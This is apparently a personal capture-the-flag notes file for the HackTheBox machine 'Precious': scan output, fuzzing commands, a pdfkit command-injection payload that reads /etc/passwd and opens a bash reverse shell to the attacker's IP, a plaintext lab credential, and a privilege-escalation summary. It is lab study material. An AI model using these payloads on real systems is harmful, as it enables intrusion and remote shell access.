# BOX NAME:

LINK: precious@HTB[](https://www.vulnhub.com/entry/kioptrix-2014-5,62/)

### **IP=10.10.11.189**

**URL=http://precious.htb**

# Remote Enumeration & Scan-outputs:

### <ins>Host Discovery</ins>

```
10.10.11.189
```

### <ins>Nmap scan</ins>

```
└─# nmap -n -sS $IP -p-
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-19 15:15 EST
Nmap scan report for 10.10.11.189
Host is up (0.046s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9999/tcp open  abyss
```

### <ins>Nikto scan</ins>

```
null
```

### <ins>Whatweb scan</ins>

```
└─# whatweb $URL | tr ',' '\n'
http://precious.htb [200 OK] Country[RESERVED][ZZ]
 HTML5
 HTTPServer[nginx/1.18.0 + Phusion Passenger(R) 6.0.15]
 IP[10.10.11.189]
 Ruby-on-Rails
 Title[Convert Web Page to PDF]
 UncommonHeaders[x-content-type-options]
 X-Frame-Options[SAMEORIGIN]
 X-Powered-By[Phusion Passenger(R) 6.0.15]
 X-XSS-Protection[1; mode=block]
 nginx[1.18.0]
```

# Fuzz

`ffuf -w /base/wordlists/web-fuzz/raft-large-directories.txt -u $URL/FUZZ/`
`ffuf -w /base/wordlists/web-fuzz/raft-large-files.txt -u $URL/FUZZ -recursion -mc 200,301,403`
`ffuf -w path/to/param_names.txt -u https://target/script.php?FUZZ=test_value -fs 4242`

```
null
```

# Special searchsploit findings:

### \[+\] Port 22 \[SSH\]

```
[+] Port 80 [HTTP]
http://precious.htb
has a html-to-pdf converter.
```

```
page vulnerable to command injection.
https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795**Payload**
[http://10.10.14.168/?name=#](http://10.10.14.168/?name= "http://10.10.14.168/?name=#"){'%20`cat /etc/passwd`'}
[http://10.10.14.168/?name=#](http://10.10.14.168/?name= "http://10.10.14.168/?name=#"){'%20`cat /etc/passwd`'}
[http://10.10.14.168/?name=#](http://10.10.14.168/?name= "http://10.10.14.168/?name=#"){'%20`bash -c 'bash -i &> /dev/tcp/10.10.14.168/31337 0>&1'`'}
```

# Local Filesystem Findings:

### **FILES OF INTEREST**

```
/home/ruby/.bundle/config
```

### **SUID**

```
44K -rwsr-xr-x 1 root root 44K Feb  7  2020 /usr/bin/newgrp
52K -rwsr-xr-x 1 root root 52K Feb  7  2020 /usr/bin/chsh
36K -rwsr-xr-x 1 root root 35K Jan 20  2022 /usr/bin/umount
60K -rwsr-xr-x 1 root root 58K Feb  7  2020 /usr/bin/chfn
180K -rwsr-xr-x 1 root root 179K Feb 27  2021 /usr/bin/sudo
72K -rwsr-xr-x 1 root root 71K Jan 20  2022 /usr/bin/su
88K -rwsr-xr-x 1 root root 87K Feb  7  2020 /usr/bin/gpasswd
64K -rwsr-xr-x 1 root root 63K Feb  7  2020 /usr/bin/passwd
56K -rwsr-xr-x 1 root root 55K Jan 20  2022 /usr/bin/mount
36K -rwsr-xr-x 1 root root 35K Feb 26  2021 /usr/bin/fusermount
52K -rwsr-xr-- 1 root messagebus 51K Oct  5 07:04 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
472K -rwsr-xr-x 1 root root 471K Jul  1  2022 /usr/lib/openssh/ssh-keysign
```

### SGID

```
ruby@precious:/var/www/pdfapp$ find / -perm -g=s -type f 2>/dev/null -exec ls -lshat {} \;
<perm -g=s -type f 2>/dev/null -exec ls -lshat {} \;
348K -rwxr-sr-x 1 root ssh 347K Jul  1  2022 /usr/bin/ssh-agent
44K -rwxr-sr-x 1 root crontab 43K Feb 22  2021 /usr/bin/crontab
32K -rwxr-sr-x 1 root shadow 31K Feb  7  2020 /usr/bin/expiry
36K -rwxr-sr-x 1 root tty 35K Jan 20  2022 /usr/bin/wall
80K -rwxr-sr-x 1 root shadow 79K Feb  7  2020 /usr/bin/chage
40K -rwxr-sr-x 1 root shadow 38K Aug 26  2021 /usr/sbin/unix_chkpwd
```

### **Dumps, outputs, other useful information**

**Kernel Info:
*file /bin/bash ; echo -e " \\n" && lsb_release -a ; echo -e "\\n" && uname -a*

```
ruby@precious:/var/www/pdfapp$ file /usr/bin/bash ; echo -e " \n" && lsb_release -a ; echo -e "\n" && uname -a
< " \n" && lsb_release -a ; echo -e "\n" && uname -a
bash: file: command not found
 

No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 11 (bullseye)
Release:        11
Codename:       bullseye


Linux precious 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64 GNU/Linux
```

# Credentials:

```
username:password

henry:Q3c1AqGHtoI0aXAYFH
```

# Hashes:

```
MD4:
MD5:
SHA1:
SHA512:
```

# Exploits and Payloads:

```
[+] CVE-2022-0847
[+] Ruby 2.x Universal RCE Deserialization Gadget Chain
```

# Writeup:

```
Started with enumeration.
Found the HTML-TO-PDF converter, figured out it was pdfkit v0.8.6.
Found the Command Injection from Snyk.io
Later on box tried the DirtyPipe exploit, did not work.
Eventually found the .bundle/config file with henrys password
henry was able to run | (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb |
figured out a way to exploit dependencies with ruby and came accross
# https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565

modified the payload to pop me a root shell. "git_set /bin/bash".
```

==PROOFS
====![72631871d47a17213a46e5066b5f28d3.png](../../_resources/72631871d47a17213a46e5066b5f28d3.png)==